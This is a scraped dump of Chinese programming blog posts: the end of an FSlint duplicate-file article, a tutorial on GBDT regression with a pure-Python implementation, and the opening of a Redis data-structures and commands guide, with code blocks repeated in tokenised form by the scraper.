,~,/,Downloads,/,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,获取每个工具更多细节，例如：,findup,，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ /usr/share/fslint/fslint/findup --help,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,/,usr,/,share,/,fslint,/,fslint,/,findup, ,--,help,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,关于 FSlint 的更多细节，参照帮助部分和 man 页。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ /usr/share/fslint/fslint/fslint --help\r\n$ man fslint,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,/,usr,/,share,/,fslint,/,fslint,/,fslint, ,--,help,$, ,man ,fslint,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,总结,\n,现在你知道在 Linux 中，使用三个工具来查找和删除不需要的重复文件。这三个工具中，我经常使用 Rdfind。这并不意味着其他的两个工具效率低下，因为到目前为止我更喜欢 Rdfind。好了，到你了。你的最喜欢哪一个工具呢？为什么？在下面的评论区留言让我们知道吧。,\n,就到这里吧。希望这篇文章对你有帮助。更多的好东西就要来了，敬请期待。,\n,谢谢！,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114455/", "url_object_id": "7d7ff91d7ad7e2d2a0d34d3c83959d6c", "front_image_path": "full/cc46810de4d4f03e9a6d0efb47fea756cb975a55.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/9e08e0b08f1c54458be8116208d9b31c.jpg"], "title": "GBDT 回归的原理与 Python 实现", "create_time": "2018/09/05", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,伯乐在线读者, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,提到GBDT回归相信大家应该都不会觉得陌生（不陌生你点进来干嘛[捂脸]），本文就GBDT回归的基本原理进行讲解，并手把手、肩并肩地带您实现这一算法。,\n,\n,完整实现代码请参考本人的p…哦不是…github：,\n,\n,gbdt_base.pygithub.com,\n,gbdt_regressor.pygithub.com,\n,gbdt_regressor_example.pygithub.com,\n,\n,1. 原理篇,\n,我们用人话而不是大段的数学公式来讲讲GBDT回归是怎么一回事。,\n,1.1 温故知新,\n,回归树是GBDT的基础，之前的一篇文章曾经讲过回归树的原理和实现。链接如下：,\n,李小文：回归树的原理与Python实现zhuanlan.zhihu.com,\n,1.2 预测年龄,\n,仍然以预测同事年龄来举例，从,《回归树》,那篇文章中我们可以知道，如果需要通过一个常量来预测同事的年龄，平均值是最佳的选择之一。,\n,1.3 年龄的残差,\n,我们不妨假设同事的年龄分别为5岁、6岁、7岁，那么同事的平均年龄就是6岁。所以我们用6岁这个常量来预测同事的年龄，即[6, 6, 6]。每个同事年龄的残差 = 年龄 – 预测值 = [5, 6, 7] – [6, 6, 6]，所以残差为[-1, 0, 1],\n,1.4 预测年龄的残差,\n,为了让模型更加准确，其中一个思路是让残差变小。如何减少残差呢？我们不妨对残差建立一颗回归树，然后预测出准确的残差。假设这棵树预测的残差是[-0.9, 0, 0.9]，将上一轮的预测值和这一轮的预测值求和，每个同事的年龄 = [6, 6, 6] + [-0.9, 0, 0.9] = [5.1, 6, 6.9]，显然与真实值[5, 6, 7]更加接近了， 年龄的残差此时变为[-0.1, 0, 0.1]。显然，预测的准确性得到了提升。,\n,1.5 GBDT,\n,重新整理一下思路，假设我们的预测一共迭代3轮 年龄：[5, 6, 7],\n,第1轮预测：[6, 6, 6] (平均值),\n,第1轮残差：[-1, 0, 1],\n,第2轮预测：[6, 6, 6] (平均值) + [-0.9, 0, 0.9] (第1颗回归树) = [5.1, 6, 6.9],\n,第2轮残差：[-0.1, 0, 0.1],\n,第3轮预测：[6, 6, 6] (平均值) + [-0.9, 0, 0.9] (第1颗回归树) + [-0.08, 0, 0.07] (第2颗回归树) = [5.02, 6, 6.97],\n,第3轮残差：[-0.08, 0, 0.03],\n,看上去残差越来越小，而这种预测方式就是GBDT算法。,\n,1.6 公式推导,\n,看到这里，相信您对GBDT已经有了直观的认识。这么做有什么科学依据么，为什么残差可以越来越小呢？前方小段数学公式低能预警。,\n,\n,假设要做m轮预测，预测函数为Fm，初始常量或每一轮的回归树为fm，输入变量为X，有：,\n,\n,设要预测的变量为y，采用MSE作为损失函数：,\n,\n,我们知道泰勒公式的一阶展开式是长成这个样子滴：,\n,\n,如果：,\n,\n,那么，根据式3和式4可以得出：,\n,\n,根据式2可以知道，损失函数的一阶偏导数为:,\n,\n,根据式6可以知道，损失函数的二阶偏导数为：,\n,\n,蓄力结束，开始放大招。根据式1，损失函数的一阶导数为：,\n,\n,根据式5，将式8进一步展开为：,\n,\n,令式9，即损失函数的一阶偏导数为0，那么：,\n,\n,将式6，式7代入式9得到：,\n,\n,\n,因此，我们需要通过用第m-1轮残差的均值来得到函数fm，进而优化函数Fm。而回归树的原理就是通过最佳划分区域的均值来进行预测。所以fm可以选用回归树作为基础模型，将初始值，m-1颗回归树的预测值相加便可以预测y。,\n,2. 实现篇,\n,本人用全宇宙最简单的编程语言——Python实现了GBDT回归算法，没有依赖任何第三方库，便于学习和使用。简单说明一下实现过程，更详细的注释请参考本人github上的代码。,\n,2.1 导入回归树类,\n,回归树是我之前已经写好的一个类，在之前的文章详细介绍过，代码请参考：,\n,regression_tree.pygithub.com,\n,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfrom ..tree.regression_tree import RegressionTree,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,from, ,.,.,tree,.,regression_tree ,import ,RegressionTree,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,2.2 创建GradientBoostingBase类,\n,初始化，存储回归树、学习率、初始预测值和变换函数。（注：回归不需要做变换，因此函数的返回值等于参数）,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nclass GradientBoostingBase(object):\r\n    def __init__(self):\r\n        self.trees = None\r\n        self.lr = None\r\n        self.init_val = None\r\n        self.fn = lambda x: x,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,class, ,GradientBoostingBase,(,object,),:,    ,def ,__init__,(,self,),:,        ,self,.,trees, ,=, ,None,        ,self,.,lr, ,=, ,None,        ,self,.,init_val, ,=, ,None,        ,self,.,fn, ,=, ,lambda, ,x,:, ,x,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,2.3 计算初始预测值,\n,初始预测值即y的平均值。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _get_init_val(self, y):\r\n    return sum(y) / len(y),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_get_init_val,(,self,,, ,y,),:,    ,return, ,sum,(,y,), ,/, ,len,(,y,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,2.4 计算残差,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _get_residuals(self, y, y_hat):\r\n    return [yi - self.fn(y_hat_i) for yi, y_hat_i in zip(y, y_hat)],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_get_residuals,(,self,,, ,y,,, ,y_hat,),:,    ,return, ,[,yi, ,-, ,self,.,fn,(,y_hat_i,), ,for, ,yi,,, ,y_hat_i ,in, ,zip,(,y,,, ,y_hat,),],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,2.5 训练模型,\n,训练模型的时候需要注意以下几点： 1. 控制树的最大深度max_depth； 2. 控制分裂时最少的样本量min_samples_split； 3. 训练每一棵回归树的时候要乘以一个学习率lr，防止模型过拟合； 4. 对样本进行抽样的时候要采用有放回的抽样方式。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef fit(self, X, y, n_estimators, lr, max_depth, min_samples_split, subsample=None):\r\n    self.init_val = self._get_init_val(y)\r\n\r\n    n = len(y)\r\n    y_hat = [self.init_val] * n\r\n    residuals = self._get_residuals(y, y_hat)\r\n\r\n    self.trees = []\r\n    self.lr = lr\r\n    for _ in range(n_estimators):\r\n        idx = range(n)\r\n        if subsample is not None:\r\n            k = int(subsample * n)\r\n            idx = choices(population=idx, k=k)\r\n        X_sub = [X[i] for i in idx]\r\n        residuals_sub = [residuals[i] for i in idx]\r\n        y_hat_sub = [y_hat[i] for i in idx]\r\n\r\n        tree = RegressionTree()\r\n        tree.fit(X_sub, residuals_sub, max_depth, min_samples_split)\r\n\r\n        self._update_score(tree, X_sub, y_hat_sub, residuals_sub)\r\n\r\n        y_hat = [y_hat_i + lr * res_hat_i for y_hat_i,\r\n                    res_hat_i in zip(y_hat, tree.predict(X))]\r\n\r\n        residuals = self._get_residuals(y, y_hat)\r\n        self.trees.append(tree),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,fit,(,self,,, ,X,,, ,y,,, ,n_estimators,,, ,lr,,, ,max_depth,,, ,min_samples_split,,, ,subsample,=,None,),:,    ,self,.,init_val, ,=, ,self,.,_get_init_val,(,y,), ,    ,n, ,=, ,len,(,y,),    ,y_hat, ,=, ,[,self,.,init_val,], ,*, ,n,    ,residuals, ,=, ,self,.,_get_residuals,(,y,,, ,y_hat,), ,    ,self,.,trees, ,=, ,[,],    ,self,.,lr, ,=, ,lr,    ,for, ,_, ,in, ,range,(,n_estimators,),:,        ,idx, ,=, ,range,(,n,),        ,if, ,subsample ,is, ,not, ,None,:,            ,k, ,=, ,int,(,subsample *, ,n,),            ,idx, ,=, ,choices,(,population,=,idx,,, ,k,=,k,),        ,X_sub, ,=, ,[,X,[,i,], ,for, ,i, ,in, ,idx,],        ,residuals_sub, ,=, ,[,residuals,[,i,], ,for, ,i, ,in, ,idx,],        ,y_hat_sub, ,=, ,[,y_hat,[,i,], ,for, ,i, ,in, ,idx,], ,        ,tree, ,=, ,RegressionTree,(,),        ,tree,.,fit,(,X_sub,,, ,residuals_sub,,, ,max_depth,,, ,min_samples_split,), ,        ,self,.,_update_score,(,tree,,, ,X_sub,,, ,y_hat_sub,,, ,residuals_sub,), ,        ,y_hat, ,=, ,[,y_hat_i, ,+, ,lr *, ,res_hat_i ,for, ,y_hat_i,,,                    ,res_hat_i ,in, ,zip,(,y_hat,,, ,tree,.,predict,(,X,),),], ,        ,residuals, ,=, ,self,.,_get_residuals,(,y,,, ,y_hat,),        ,self,.,trees,.,append,(,tree,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,2.6 预测一个样本,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _predict(self, Xi):\r\n    return self.fn(self.init_val + sum(self.lr * tree._predict(Xi) for tree in self.trees)),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_predict,(,self,,, ,Xi,),:,    ,return, ,self,.,fn,(,self,.,init_val, ,+, ,sum,(,self,.,lr *, ,tree,.,_predict,(,Xi,), ,for, ,tree ,in, ,self,.,trees,),),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,2.7 预测多个样本,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef predict(self, X):\r\n    return [self._predict(Xi) for Xi in X],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,predict,(,self,,, ,X,),:,    ,return, ,[,self,.,_predict,(,Xi,), ,for, ,Xi ,in, ,X,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,3 效果评估,\n,3.1 main函数,\n,使用著名的波士顿房价数据集，按照7:3的比例拆分为训练集和测试集，训练模型，并统计准确度。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n@run_time\r\ndef main():\r\n    print(\"Tesing the accuracy of GBDT regressor...\")\r\n\r\n    X, y = load_boston_house_prices()\r\n\r\n    X_train, X_test, y_train, y_test = train_test_split(\r\n        X, y, random_state=10)\r\n\r\n    reg = GradientBoostingRegressor()\r\n    reg.fit(X=X_train, y=y_train, n_estimators=4,\r\n            lr=0.5, max_depth=2, min_samples_split=2)\r\n\r\n    get_r2(reg, X_test, y_test),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,@,run_time,def ,main,(,),:,    ,print,(,\"Tesing the accuracy of GBDT regressor...\",), ,    ,X,,, ,y, ,=, ,load_boston_house_prices,(,), ,    ,X_train,,, ,X_test,,, ,y_train,,, ,y_test, ,=, ,train_test_split,(,        ,X,,, ,y,,, ,random_state,=,10,), ,    ,reg, ,=, ,GradientBoostingRegressor,(,),    ,reg,.,fit,(,X,=,X_train,,, ,y,=,y_train,,, ,n_estimators,=,4,,,            ,lr,=,0.5,,, ,max_depth,=,2,,, ,min_samples_split,=,2,), ,    ,get_r2,(,reg,,, ,X_test,,, ,y_test,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,3.2 效果展示,\n,最终拟合优度0.851，运行时间2.2秒，效果还算不错~,\n,\n,3.3 工具函数,\n,本人自定义了一些工具函数，可以在github上查看,\n,utils.pygithub.com,\n,1. run_time – 测试函数运行时间,\n,2. load_boston_house_prices – 加载波士顿房价数据,\n,3. train_test_split – 拆分训练集、测试集,\n,4. get_r2 – 计算拟合优度,\n,总结,\n,GBDT回归的原理：平均值加回归树,\n,GBDT回归的实现：加加减减for循环,\n,【关于作者】,\n,李小文：先后从事过数据分析、数据挖掘工作，主要开发语言是Python，现任一家小型互联网公司的算法工程师。Github: ,https://github.com/tushushu,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,伯乐在线读者,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            ① 本账号用于发布那些在伯乐在线无账号的读者的投稿，包括译文和原创文章。② 欢迎加入伯乐在线专栏作者：http://blog.jobbole.com/99322/        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 34,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114351/", "url_object_id": "b55de04af9ae4faef14ef32e4c533022", "front_image_path": "full/ecce700fc49a6c9d59f6f5aac1822d3a8c7a69b3.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "Redis基础、高级特性与性能调优", "create_time": "2018/10/16", "vote": "1", "bookmark": "4", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,kelgon,   ,本文将从Redis的基本特性入手，通过讲述Redis的数据结构和主要命令对Redis的基本能力进行直观介绍。之后概览Redis提供的高级能力，并在部署、维护、性能调优等多个方面进行更深入的介绍和指导。,\n本文适合使用Redis的普通开发人员，以及对Redis进行选型、架构设计和性能调优的架构设计人员。,\n,目录,\n,\n,概述,\n,Redis的数据结构和相关常用命令,\n,数据持久化,\n,内存管理与数据淘汰机制,\n,Pipelining,\n,事务与Scripting,\n,Redis性能调优,\n,主从复制与集群分片,\n,Redis Java客户端的选择,\n,\n,概述,\n,Redis是一个开源的，基于内存的结构化数据存储媒介，可以作为数据库、缓存服务或消息服务使用。,\nRedis支持多种数据结构，包括字符串、哈希表、链表、集合、有序集合、位图、Hyperloglogs等。,\nRedis具备LRU淘汰、事务实现、以及不同级别的硬盘持久化等能力，并且支持副本集和通过Redis Sentinel实现的高可用方案，同时还支持通过Redis Cluster实现的数据自动分片能力。,\n,Redis的主要功能都基于单线程模型实现，也就是说Redis使用一个线程来服务所有的客户端请求，同时Redis采用了非阻塞式IO，并精细地优化各种命令的算法时间复杂度，这些信息意味着：,\n,\n,Redis是线程安全的（因为只有一个线程），其所有操作都是原子的，不会因并发产生数据异常,\n,Redis的速度非常快（因为使用非阻塞式IO，且大部分命令的算法时间复杂度都是O(1)),\n,使用高耗时的Redis命令是很危险的，会占用唯一的一个线程的大量处理时间，导致所有的请求都被拖慢。（例如时间复杂度为O(N)的KEYS命令，严格禁止在生产环境中使用）,\n,\n,Redis的数据结构和相关常用命令,\n,本节中将介绍Redis支持的主要数据结构，以及相关的常用Redis命令。本节只对Redis命令进行扼要的介绍，且只列出了较常用的命令。如果想要了解完整的Redis命令集，或了解某个命令的详细使用方法，请参考官方文档：,https://redis.io/commands,\n,Key,\n,Redis采用Key-Value型的基本数据结构，任何二进制序列都可以作为Redis的Key使用（例如普通的字符串或一张JPEG图片）,\n关于Key的一些注意事项：,\n,\n,不要使用过长的Key。例如使用一个1024字节的key就不是一个好主意，不仅会消耗更多的内存，还会导致查找的效率降低,\n,Key短到缺失了可读性也是不好的，例如”u1000flw”比起”user:1000:followers”来说，节省了寥寥的存储空间，却引发了可读性和可维护性上的麻烦,\n,最好使用统一的规范来设计Key，比如”object-type:id:attr”，以这一规范设计出的Key可能是”user:1000″或”comment:1234:reply-to”,\n,Redis允许的最大Key长度是512MB（对Value的长度限制也是512MB）,\n,\n,String,\n,String是Redis的基础数据类型，Redis没有Int、Float、Boolean等数据类型的概念，所有的基本类型在Redis中都以String体现。,\n,与String相关的常用命令：,\n,\n,SET,：为一个key设置value，可以配合EX/PX参数指定key的有效期，通过NX/XX参数针对key是否存在的情况进行区别操作，时间复杂度O(1),\n,GET,：获取某个key对应的value，时间复杂度O(1),\n,GETSET,：为一个key设置value，并返回该key的原value，时间复杂度O(1),\n,MSET,：为多个key设置value，时间复杂度O(N),\n,MSETNX,：同MSET，如果指定的key中有任意一个已存在，则不进行任何操作，时间复杂度O(N),\n,MGET,：获取多个key对应的value，时间复杂度O(N),\n,\n,上文提到过，Redis的基本数据类型只有String，但Redis可以把String作为整型或浮点型数字来使用，主要体现在INCR、DECR类的命令上：,\n,\n,INCR,：将key对应的value值自增1，并返回自增后的值。只对可以转换为整型的String数据起作用。时间复杂度O(1),\n,INCRBY,：将key对应的value值自增指定的整型数值，并返回自增后的值。只对可以转换为整型的String数据起作用。时间复杂度O(1),\n,DECR/DECRBY,：同INCR/INCRBY，自增改为自减。,\n,\n,INCR/DECR系列命令要求操作的value类型为String，并可以转换为64位带符号的整型数字，否则会返回错误。,\n也就是说，进行INCR/DECR系列命令的value，必须在[-2^63 ~ 2^63 – 1]范围内。,\n,前文提到过，Redis采用单线程模型，天然是线程安全的，这使得INCR/DECR命令可以非常便利的实现高并发场景下的精确控制。,\n,例1：库存控制,\n,在高并发场景下实现库存余量的精准校验，确保不出现超卖的情况。,\n,设置库存总量：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSET inv:remain \"100\"\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SET ,inv,:,remain, ,\"100\", ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,库存扣减+余量校验：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nDECR inv:remain\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,DECR ,inv,:,remain, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当DECR命令返回值大于等于0时，说明库存余量校验通过，如果返回小于0的值，则说明库存已耗尽。,\n,假设同时有300个并发请求进行库存扣减，Redis能够确保这300个请求分别得到99到-200的返回值，每个请求得到的返回值都是唯一的，绝对不会找出现两个请求得到一样的返回值的情况。,\n,例2：自增序列生成,\n,实现类似于RDBMS的Sequence功能，生成一系列唯一的序列号,\n,设置序列起始值：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSET sequence \"10000\"\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SET ,sequence, ,\"10000\", ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,获取一个序列值：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nINCR sequence\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,INCR ,sequence, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,直接将返回值作为序列使用即可。,\n,获取一批（如100个）序列值：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nINCRBY sequence 100\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,INCRBY ,sequence, ,100, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,假设返回值为N，那么[N – 99 ~ N]的数值都是可用的序列值。,\n,当多个客户端同时向Redis申请自增序列时，Redis能够确保每个客户端得到的序列值或序列范围都是全局唯一的，绝对不会出现不同客户端得到了重复的序列值的情况。,\n,List,\n,Redis的List是链表型的数据结构，可以使用LPUSH/RPUSH/LPOP/RPOP等命令在List的两端执行插入元素和弹出元素的操作。虽然List也支持在特定index上插入和读取元素的功能，但其时间复杂度较高（O(N)），应小心使用。,\n,与List相关的常用命令：,\n,\n,LPUSH,：向指定List的左侧（即头部）插入1个或多个元素，返回插入后的List长度。时间复杂度O(N)，N为插入元素的数量,\n,RPUSH,：同LPUSH，向指定List的右侧（即尾部）插入1或多个元素,\n,LPOP,：从指定List的左侧（即头部）移除一个元素并返回，时间复杂度O(1),\n,RPOP,：同LPOP，从指定List的右侧（即尾部）移除1个元素并返回,\n,LPUSHX/RPUSHX,：与LPUSH/RPUSH类似，区别在于，LPUSHX/RPUSHX操作的key如果不存在，则不会进行任何操作,\n,LLEN,：返回指定List的长度，时间复杂度O(1),\n,LRANGE,：返回指定List中指定范围的元素（双端包含，即LRANGE key 0 10会返回11个元素），时间复杂度O(N)。应尽可能控制一次获取的元素数量，一次获取过大范围的List元素会导致延迟，同时对长度不可预知的List，避免使用LRANGE key 0 -1这样的完整遍历操作。,\n,\n,应谨慎使用的List相关命令：,\n,\n,LINDEX,：返回指定List指定index上的元素，如果index越界，返回nil。index数值是回环的，即-1代表List最后一个位置，-2代表List倒数第二个位置。时间复杂度O(N),\n,LSET,：将指定List指定index上的元素设置为value，如果index越界则返回错误，时间复杂度O(N)，如果操作的是头/尾部的元素，则时间复杂度为O(1),\n,LINSERT,：向指定List中指定元素之前/之后插入一个新元素，并返回操作后的List长度。如果指定的元素不存在，返回-1。如果指定key不存在，不会进行任何操作，时间复杂度O(N),\n,\n,由于Redis的List是链表结构的，上述的三个命令的算法效率较低，需要对List进行遍历，命令的耗时无法预估，在List长度大的情况下耗时会明显增加，应谨慎使用。,\n,换句话说，Redis的List实际是设计来用于实现队列，而不是用于实现类似ArrayList这样的列表的。如果你不是想要实现一个双端出入的队列，那么请尽量不要使用Redis的List数据结构。,\n,为了更好支持队列的特性，Redis还提供了一系列阻塞式的操作命令，如BLPOP/BRPOP等，能够实现类似于BlockingQueue的能力，即在List为空时，阻塞该连接，直到List中有对象可以出队时再返回。针对阻塞类的命令，此处不做详细探讨，请参考官方文档（,https://redis.io/topics/data-types-intro,） 中”Blocking operations on lists”一节。,\n,Hash,\n,Hash即哈希表，Redis的Hash和传统的哈希表一样，是一种field-value型的数据结构，可以理解成将HashMap搬入Redis。,\nHash非常适合用于表现对象类型的数据，用Hash中的field对应对象的field即可。,\nHash的优点包括：,\n,\n,可以实现二元查找，如”查找ID为1000的用户的年龄”,\n,比起将整个对象序列化后作为String存储的方法，Hash能够有效地减少网络传输的消耗,\n,当使用Hash维护一个集合时，提供了比List效率高得多的随机访问命令,\n,\n,与Hash相关的常用命令：,\n,\n,HSET,：将key对应的Hash中的field设置为value。如果该Hash不存在，会自动创建一个。时间复杂度O(1),\n,HGET,：返回指定Hash中field字段的值，时间复杂度O(1),\n,HMSET/HMGET,：同HSET和HGET，可以批量操作同一个key下的多个field，时间复杂度：O(N)，N为一次操作的field数量,\n,HSETNX,：同HSET，但如field已经存在，HSETNX不会进行任何操作，时间复杂度O(1),\n,HEXISTS,：判断指定Hash中field是否存在，存在返回1，不存在返回0，时间复杂度O(1),\n,HDEL,：删除指定Hash中的field（1个或多个），时间复杂度：O(N)，N为操作的field数量,\n,HINCRBY,：同INCRBY命令，对指定Hash中的一个field进行INCRBY，时间复杂度O(1),\n,\n,应谨慎使用的Hash相关命令：,\n,\n,HGETALL,：返回指定Hash中所有的field-value对。返回结果为数组，数组中field和value交替出现。时间复杂度O(N),\n,HKEYS/HVALS,：返回指定Hash中所有的field/value，时间复杂度O(N),\n,\n,上述三个命令都会对Hash进行完整遍历，Hash中的field数量与命令的耗时线性相关，对于尺寸不可预知的Hash，应严格避免使用上面三个命令，而改为使用HSCAN命令进行游标式的遍历，具体请见 ,https://redis.io/commands/scan,\n,Set,\n,Redis 